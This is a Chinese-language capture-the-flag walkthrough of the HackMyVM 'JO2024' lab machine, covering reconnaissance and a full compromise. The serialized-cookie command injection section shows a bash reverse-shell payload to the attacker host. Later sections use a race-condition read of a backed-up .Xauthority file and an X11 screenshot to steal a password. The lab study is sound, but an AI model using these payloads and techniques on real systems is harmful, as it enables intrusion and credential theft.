---
title: HackMyVM-JO2024
published: 2025-03-09 16:23:40
tags: [HackMyVM]
category: 靶机
draft: false
---

# JO2024.

> https://hackmyvm.eu/machines/machine.php?vm=JO2024
> 

Notes：**Enjoy it.**

## 信息收集

```python
nmap -sP 192.168.56.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-28 03:20 EST
Nmap scan report for 192.168.56.1
Host is up (0.00045s latency).
MAC Address: 0A:00:27:00:00:09 (Unknown)
Nmap scan report for 192.168.56.2
Host is up (0.00046s latency).
MAC Address: 08:00:27:AC:8D:22 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.13
Host is up (0.00055s latency).
MAC Address: 08:00:27:10:57:22 (Oracle VirtualBox virtual NIC
```

```python
nmap -sT -min-rate 10000 -p- 192.168.56.13
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-28 03:21 EST
Nmap scan report for 192.168.56.13
Host is up (0.0013s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:10:57:22 (Oracle VirtualBox virtual NIC)
Nmap done: 1 IP address (1 host up) scanned in 18.75 seconds
```

```python
nmap -sT -sV -O -p- 192.168.56.13     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-28 03:21 EST
Nmap scan report for 192.168.56.13
Host is up (0.00062s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.61 ((Debian))
MAC Address: 08:00:27:10:57:22 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.37 seconds
```

```python
nmap -script=vuln -p- 192.168.56.13
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-28 03:22 EST
Nmap scan report for 192.168.56.13
Host is up (0.00067s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-fileupload-exploiter: 
|   
|_    Couldn't find a file-type field.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
| http-enum: 
|_  /img/: Potentially interesting directory w/ listing on 'apache/2.4.61 (debian)'
MAC Address: 08:00:27:10:57:22 (Oracle VirtualBox virtual NIC)
```

枚举出可能有兴趣的目录`img`

访问主页，是关于巴黎奥运会的信息

![image.png](image%2033.png)

## 渗透

### img目录

查看一下之前`nmap`扫出来可能有趣的目录，仅此而已

![image.png](image%2034.png)

再扫描一次目录，依旧如此

```python
dirsearch -u http://192.168.56.13 -x 403 -e php,zip,txt
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, zip, txt | HTTP method: GET | Threads: 25 | Wordlist size: 10439

Output File: /root/reports/http_192.168.56.13/_25-01-28_04-03-01.txt

Target: http://192.168.56.13/

[04:03:01] Starting: 
[04:03:34] 301 -  312B  - /img  ->  http://192.168.56.13/img/               
                                                                             
Task Completed
```

在页面中无法找到可以利用的点，所以使用更多的扫描

```python
gobuster dir -u 192.168.56.13 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.13
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 7812]
/img                  (Status: 301) [Size: 312] [--> http://192.168.56.13/img/]
/preferences.php      (Status: 200) [Size: 3163]
/.php                 (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 661680 / 661683 (100.00%)
===============================================================
Finished
===============================================================
```

### preferences.php

发现一个`preferences.php` 访问

![image.png](image%2035.png)

抓包看看参数，发现`Cookie`存在`preferences`参数

```python
GET /preferences.php HTTP/1.1
Host: 192.168.56.13
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Sec-GPC: 1
Connection: keep-alive
Cookie: preferences=TzoxNToiVXNlclByZWZlcmVuY2VzIjoyOntzOjg6Imxhbmd1YWdlIjtzOjI6ImZyIjtzOjE1OiJiYWNrZ3JvdW5kQ29sb3IiO3M6NDoiI2RkZCI7fQ%3D%3D
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

参数看着像是`base64` ，尝试解码，解码后看着像是序列化格式的数据：存在一个类**`UserPreferences`** 参数…

```python
O:15:"UserPreferences":2:{s:8:"language";s:2:"fr";s:15:"backgroundColor";s:4:"#ddd";}
```

尝试修改颜色`#ddd` 为`#DC143C` ，修改后进行`base64`编码，然后替换上去，颜色就变了

```python
O:15:"UserPreferences":2:{s:8:"language";s:2:"fr";s:15:"backgroundColor";s:7:"#DC143C";}
```

![image.png](image%2036.png)

其中的`language`可能存在命令执行，尝试将`fr`修改为语句，成功将命令回显

```python
O:15:"UserPreferences":2:{s:8:"language";s:6:"whoami";s:15:"backgroundColor";s:7:"#DC143C";}
```

![image.png](image%2037.png)

### 反弹shell

将其换成反弹shell语句，`kaliIP`为`4` ，同时`Kali`开启监听

```python
O:15:"UserPreferences":2:{s:8:"language";s:57:"/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.4/1234 0>&1'";s:15:"backgroundColor";s:7:"#DC143C";}
```

成功获取`shell`

```python
┌──(root㉿kali)-[~]
└─# nc -lvp 1234            
listening on [any] 1234 ...
192.168.56.13: inverse host lookup failed: Host name lookup failure
connect to [192.168.56.4] from (UNKNOWN) [192.168.56.13] 37692
bash: cannot set terminal process group (643): Inappropriate ioctl for device
bash: no job control in this shell
www-data@jo2024:/$ 
```

### 靶机信息收集

```python
www-data@jo2024:/home/vanity$ uname -a
Linux jo2024.hmv 6.1.0-23-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.99-1 (2024-07-15) x86_64 GNU/Linux
```

```python
www-data@jo2024:/home/vanity$ ip add
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,DYNAMIC,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 08:00:27:10:57:22 brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.13/24 brd 192.168.56.255 scope global dynamic enp0s3
       valid_lft 521sec preferred_lft 521sec
```

```python
www-data@jo2024:/home/vanity$ ls -al
total 76
drwxr-xr-x 10 vanity vanity 4096 Jan 28 09:21 .
drwxr-xr-x  3 root   root   4096 Jul 28  2024 ..
-rw-------  1 vanity vanity  158 Jan 28 09:20 .Xauthority
lrwxrwxrwx  1 root   root      9 Jul 26  2024 .bash_history -> /dev/null
-rw-r--r--  1 vanity vanity  220 Jul 29  2024 .bash_logout
-rw-r--r--  1 vanity vanity 3526 Jul 29  2024 .bashrc
drwxr-xr-x  7 vanity vanity 4096 Jul 29  2024 .cache
drwx------ 13 vanity vanity 4096 Jul 29  2024 .config
-rw-r--r--  1 vanity vanity   35 Jul 29  2024 .dmrc
-rw-------  1 vanity vanity   36 Jul 29  2024 .lesshst
drwxr-xr-x  3 vanity vanity 4096 Jul 29  2024 .local
-rw-r--r--  1 vanity vanity  807 Jul 29  2024 .profile
drwx------  2 vanity vanity 4096 Jul 29  2024 .ssh
-rw-r--r--  1 vanity vanity    8 Jul 29  2024 .xprofile
drwxr-xr-x  2 vanity vanity 4096 Jul 29  2024 Desktop
drwxr-xr-x  2 vanity vanity 4096 Jul 29  2024 Documents
drwxr-xr-x  2 vanity vanity 4096 Jul 29  2024 Images
-rwxr-xr-x  1 vanity vanity  557 Jul 29  2024 backup
drwx------  2 vanity vanity 4096 Jul 29  2024 creds
-rwx------  1 vanity vanity   33 Jul 29  2024 user.txt
```

发现存在一个可执行的`backup`文件，还有我们特别想要的`.Xauthority` 文件

> 这个 `backup` 脚本的主要作用是 **备份目录 `/home/vanity` 中除 `user.txt` 文件外的所有普通文件到 `/backup` 目录**，并在备份时验证文件的完整性
> 

这个文件可能就是我们想要的

```python
www-data@jo2024:/home/vanity$ cat backup
#!/bin/bash

SRC="/home/vanity"
DEST="/backup"

rm -rf /backup/{*,.*}

echo "Starting copy..."
find "$SRC" -maxdepth 1 -type f ! -name user.txt | while read srcfile; do
    destfile="$DEST${srcfile#$SRC}"
    mkdir -p "$(dirname "$destfile")"
    dd if="$srcfile" of="$destfile" bs=4M

    md5src=$(md5sum "$srcfile" | cut -d ' ' -f1)
    md5dest=$(md5sum "$destfile" | cut -d ' ' -f1)
    if [[ "$md5src" != "$md5dest" ]]; then
        echo "MD5 mismatch for $srcfile :("
    fi
    chmod 700 "$destfile"
done
echo "Copy complete. All files verified !"
```

上传`linpeas` 和 `pspy64`收集下信息

最后通过`pspy64` 发现`backup`一直在运行，可能是存在定时任务，那么`backup`就是我们要利用的文件了

```python
2025/01/28 13:28:01 CMD: UID=1000  PID=38936  | /bin/bash /home/vanity/backup 
2025/01/28 13:28:01 CMD: UID=1000  PID=38937  | /bin/bash /home/vanity/backup 
2025/01/28 13:28:01 CMD: UID=1000  PID=38938  | /bin/bash /home/vanity/backup 
2025/01/28 13:28:01 CMD: UID=1000  PID=38941  | /bin/bash /home/vanity/backup 
2025/01/28 13:28:01 CMD: UID=1000  PID=38940  | /bin/bash /home/vanity/backup 
2025/01/28 13:28:01 CMD: UID=1000  PID=38939  | /bin/bash /home/vanity/backup 
2025/01/28 13:28:01 CMD: UID=1000  PID=38944  | /bin/bash /home/vanity/backup 
2025/01/28 13:28:01 CMD: UID=1000  PID=38943  | /bin/bash /home/vanity/backup 
2025/01/28 13:28:01 CMD: UID=1000  PID=38942  | /bin/bash /home/vanity/backup 
2025/01/28 13:28:01 CMD: UID=1000  PID=38945  | /bin/bash /home/vanity/backup 
2025/01/28 13:28:01 CMD: UID=1000  PID=38946  | /bin/bash /home/vanity/backup 
2025/01/28 13:28:01 CMD: UID=1000  PID=38947  | /bin/bash /home/vanity/backup 
2025/01/28 13:28:01 CMD: UID=1000  PID=38948  | /bin/bash /home/vanity/backup 
2025/01/28 13:28:01 CMD: UID=1000  PID=38951  | /bin/bash /home/vanity/backup 
2025/01/28 13:28:01 CMD: UID=1000  PID=38950  | /bin/bash /home/vanity/backup 
```

回到`backup` 是使用`dd`命令去备份文件的，`dd`复制文件时**不会保留原始文件的权限**，而是使用目标文件的默认权限，并且可以是看到是在复制完毕后再使用`chmod 700 "$destfile"` 去设置权限

```python
# 测试
┌──(root㉿kali)-[~/Desktop/test/jo2024]
└─# ls -al 1.txt    
-rw-r--r-- 1 root root 5  1月28日 07:39 1.txt
                                                                          
┌──(root㉿kali)-[~/Desktop/test/jo2024]
└─# chmod 700 1.txt  
                                                                          
┌──(root㉿kali)-[~/Desktop/test/jo2024]
└─# ls -al 1.txt   
-rwx------ 1 root root 5  1月28日 07:39 1.txt
                                                                          
┌──(root㉿kali)-[~/Desktop/test/jo2024]
└─# dd if=1.txt of=/tmp/2.txt bs=4M
输入了 0+1 块记录
输出了 0+1 块记录
5 字节已复制，0.000473313 s，10.6 kB/s
                                                                          
┌──(root㉿kali)-[~/Desktop/test/jo2024]
└─# ls -al /tmp/2.txt 
-rw-r--r-- 1 root root 5  1月28日 07:40 /tmp/2.txt
```

那么我们就可以使用条件竞争在它修改文件权限前读到文件即可

```python
www-data@jo2024:/$ while true; do cat /backup/.Xauthority >> /tmp/log 2>/dev/null;sleep 0.01; done
<Xauthority >> /tmp/log 2>/dev/null;sleep 0.01; done
```

查看`log`文件，是二进制文件

```python
www-data@jo2024:/$ cat /tmp/log
cat /tmp/log
debian11MIT-MAGIC-COOKIE-1>7
EXJ[fdebian0MIT-MAGIC-COOKIE-1mlJ

jo2024.hmv0MIT-MAGIC-COOKIE-1A6&Xj*Zdebian11MIT-MAGIC-COOKIE-1>7
```

### 利用 **.Xauthority**

> 关于`.Xauthority` 的利用https://book.hacktricks.xyz/network-services-pentesting/6000-pentesting-x11#screenshots-capturing
> 

查看本地会话，目标`vanity`

```python
www-data@jo2024:/$ w
 14:03:43 up  4:43,  1 user,  load average: 0.44, 0.29, 0.14
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
vanity   tty7     :0               09:20    4:43m  0.00s  0.07s /usr/bin/lxsession -s LXDE -e LXDE
```

设置环境变量

```python
export XAUTHORITY=/tmp/log
```

然后进行截图

```python
xwd -root -screen -silent -display :0 > screenshot.xwd
```

然后将截图传到`kali`上

```python
python3 -m http.server 2131
```

![image.png](image%2038.png)

然后将`xwd`格式转换为`png`

```python
convert screenshot.xwd screenshot.png
```

没想到还能这样玩 what can i say ,看样子是得到了`vanity`账户的账号密码（xd0oITR93KIQDbiD）

![image.png](image%2039.png)

登录`SSH`

```python
┌──(root㉿kali)-[~/Desktop/test/jo2024]
└─# ssh vanity@192.168.56.13
The authenticity of host '192.168.56.13 (192.168.56.13)' can't be established.
ED25519 key fingerprint is SHA256:La9YyHs4GERVO8XTRRw0cLh6XcInXX35Ar9OiMsXwQk.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:6: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.13' (ED25519) to the list of known hosts.
vanity@192.168.56.13's password: 
Linux jo2024.hmv 6.1.0-23-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.99-1 (2024-07-15) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
vanity@jo2024:~$ 
```

### UserFlag

```python
vanity@jo2024:~$ cat user.txt 
e2cb9d6e0899cde91130ca4b37139021
```

### 提权

查看用户`vanity`权限，可以以`root`权限执行一个`web`服务

```python
vanity@jo2024:/$ sudo -l
Matching Defaults entries for vanity on jo2024:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User vanity may run the following commands on jo2024:
    (ALL : ALL) NOPASSWD: /usr/local/bin/php-server.sh
```

查看脚本内容

```python
vanity@jo2024:/$ cat /usr/local/bin/php-server.sh
#!/bin/bash

/usr/bin/php -t /opt -S 0.0.0.0:8000
```

执行脚本

```python
vanity@jo2024:/$ sudo /usr/local/bin/php-server.sh
[Tue Jan 28 14:41:09 2025] PHP 8.2.20 Development Server (http://0.0.0.0:8000) started
```

访问主页

![image.png](image%2040.png)

```python
奥运会运动员密码泄漏了！

一位黑客声称已经获得了著名奥运会运动员的密码。根据黑客的说法，他设法闯入了著名的短跑运动员Usain Bolt的个人帐户！

黑客提供了他声称是Usain Bolt的帐户密码的证明，以证明他的成就。出于安全原因并保护运动员的隐私，下面的内容模糊不清，需要订阅以揭示。
```

`F12`可以看到隐藏的内容，得到信息`LightningBolt123`

```python
As part of a recent cyber attack, we managed to access Usain Bolt's personal account. The password associated with his account is <strong>LightningBolt123</strong>. This breach demonstrates the vulnerabilities of even the most secure systems.
```

### 密码碰撞

密码使用`LightningBolt123` ，成功获取到`Root`账户

```python
vanity@jo2024:/$ su root
Password: 
root@jo2024:/# 
```

### RootFlag

```python
root@jo2024:/# cat /root/root.txt 
cbd60dab37bc85e1f7ea4b5c9c4eed90
```

## 总结

1. **`.Xauthority` 文件使用**
2. `dd`命令备份文件时与文件原本的权限不同，需要另外设置